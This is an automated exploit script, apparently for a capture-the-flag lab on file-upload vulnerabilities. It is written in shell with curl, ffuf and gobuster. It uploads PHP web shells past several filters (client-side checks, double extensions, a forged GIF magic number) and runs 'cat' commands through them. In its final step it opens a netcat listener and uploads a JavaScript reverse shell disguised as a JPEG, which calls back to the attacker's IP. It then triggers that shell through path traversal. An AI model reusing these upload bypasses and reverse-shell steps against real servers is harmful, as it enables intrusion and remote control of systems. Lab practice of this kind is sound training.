#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.10.170"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

# Modify image
echo "1 - UPLOAD NEW IMAGE"
curl -s -F "image=@$scriptpath/mountain.jpg" -F "submit=Upload" -X POST "http://overwrite.uploadvulns.thm" -o $result_folder/success1.html
echo "--> Flag is : $(sed -n 's/.*Your flag is: \(.*{.*}\).*<\/main>.*/\1/p' $result_folder/success1.html)"

# Upload a reverse shell
echo "2 - UPLOAD REVERSE SHELL"
$scriptpath/../../tools/ffuf.sh -u shell.uploadvulns.thm -p 80 -t 200 -m big.txt -o $result_folder/ffuf-shell.txt
curl -s -F "fileToUpload=@$scriptpath/shell.php" -F "submit=Upload" -X POST "http://shell.uploadvulns.thm" -o $result_folder/success-shell.html
curl -s -X GET "http://shell.uploadvulns.thm/resources/shell.php?cmd=cat%20/var/www/flag.txt" > $result_folder/flag-shell.txt
echo "--> Flag is : $(cat $result_folder/flag-shell.txt)"

# Bypass client side filtering
echo "3 - BYPASS CLIENT SIDE FILTERING"
$scriptpath/../../tools/ffuf.sh -u java.uploadvulns.thm -p 80 -t 200 -m big.txt -o $result_folder/ffuf-java.txt
curl -s -F "fileToUpload=@$scriptpath/shell.php;type=text/x-php" -F "submit=Upload" -X POST "http://java.uploadvulns.thm" -o $result_folder/success-java.html
curl -s -X GET "http://java.uploadvulns.thm/images/shell.php?cmd=cat%20/var/www/flag.txt" > $result_folder/flag-java.txt
echo "--> Flag is : $(cat $result_folder/flag-java.txt)"

# Bypass server side extension filtering
echo "4 - BYPASS SERVER SIDE EXTENSION FILTERING"
$scriptpath/../../tools/ffuf.sh -u annex.uploadvulns.thm -p 80 -t 200 -m big.txt -o $result_folder/ffuf-annex.txt
cp $scriptpath/shell.php $result_folder/shell.png.php5
curl -s -F "fileToUpload=@$result_folder/shell.png.php5;type=application/octet-stream" -F "submit=Upload" -X POST "http://annex.uploadvulns.thm/"  -o $result_folder/success-annex.html
curl -s -X GET "http://annex.uploadvulns.thm/privacy"  -o $result_folder/privacy.html -L
filename=$(cat $result_folder/privacy.html | grep "shell" | sed -n 's/.*<a href="\(.*\).php5">.*/\1/p' | tail -1)
curl -s -X GET "http://annex.uploadvulns.thm/privacy/$filename.php5?cmd=cat%20/var/www/flag.txt" > $result_folder/flag-annex.txt
echo "--> Flag is : $(cat $result_folder/flag-annex.txt)"

# Bypass server side magic number filtering
echo "5 - BYPASS SERVER SIDE MAGIC NUMBER FILTERING"
$scriptpath/../../tools/ffuf.sh -u magic.uploadvulns.thm -p 80 -t 200 -m big.txt -o $result_folder/ffuf-magic.txt
echo "GIF8$(cat $scriptpath/shell.php)" > $result_folder/shell1.php
curl -s --trace-ascii temp.txt -F "fileToUpload=@$result_folder/shell1.php;type=application/octet-stream" -F"submit=Upload" -X POST "http://magic.uploadvulns.thm/"  -o $result_folder/success-magic.html
curl -s -X GET "http://magic.uploadvulns.thm/graphics/shell1.php?cmd=cat%20/var/www/flag.txt" > $result_folder/flag-magic.txt
echo "--> Flag is : $(cat $result_folder/flag-magic.txt)"

# Blackbox challenge
echo "6 - BLACKBOX CHALLENGE"
# From burp analysis, we get that the filtering is server side and mime. So whatever we do, we'll have to send data as a jpeg. 
# But there is no magic number testing, so we can send the content on a javascript shell, only it will be stored as jpg. But where ?
# Looking at the css for the background change, we notice that the 4 images url are content/XXX.jpg, where XXX are uppercase letters
# So, we can build a wordlist with all possible XXX and use gobuster to look for all images in the content path. We find one additional image
# If we access it via the browser, the associated burp history gives us the content of the jpg, which is our file
# From there, has to get the help of the walkthorough to understand that the purpose was to use the admin path (discoverd bu ffuf) to activate the
# script instead of the module (was stuck trying to discover modules).
$scriptpath/../../tools/ffuf.sh -u jewel.uploadvulns.thm -p 80 -t 200 -m big.txt -o $result_folder/ffuf-jewel.txt
rm $result_folder/trigram.txt 2> /dev/null
touch $result_folder/trigram.txt
for char1 in {A..Z}; do
    for char2 in {A..Z}; do
        for char3 in {A..Z}; do
            echo "${char1}${char2}${char3}" >> $result_folder/trigram.txt
        done
    done
done
gobuster dir --quiet --follow-redirect -w $result_folder/trigram.txt -u http://jewel.uploadvulns.thm/content -t 100 -x jpg -o $result_folder/gobuster-ref-content.txt
xterm -hold -l -lf $result_folder/shell.log -e "nc -lvnp 4444" &
cp ${scriptpath}/shell.js $result_folder/shell.js
sed -i "s/{IP}/\"${attack_ip}\"/g" $result_folder/shell.js
sed -i "s/{PORT}/4444/g" $result_folder/shell.js
image=$(base64 -w 0 $result_folder/shell.js)
curl -s -X POST "http://jewel.uploadvulns.thm/" -H "Content-Type: application/json" -d "{\"name\":\"shell.js\",\"type\":\"image/jpeg\",\"file\":\"data:image/jpeg;base64,$image\"}"
gobuster dir --quiet --follow-redirect -w $result_folder/trigram.txt -u http://jewel.uploadvulns.thm/content -t 100 -x jpg -o $result_folder/gobuster-new-content.txt
name=$(diff /work/results/gobuster-ref-content.txt /work/results/gobuster-new-content.txt | grep "(Status:\ 200)" | sed -n 's/.*\/\(.*\).jpg.*/\1/p' | tail -1)
echo "--> Script loaded as : $name"
curl -s -X POST "http://jewel.uploadvulns.thm/admin" -H "Content-Type: application/x-www-form-urlencoded" -d "cmd=..%2Fcontent%2F$name.jpg" --trace-ascii temp.txt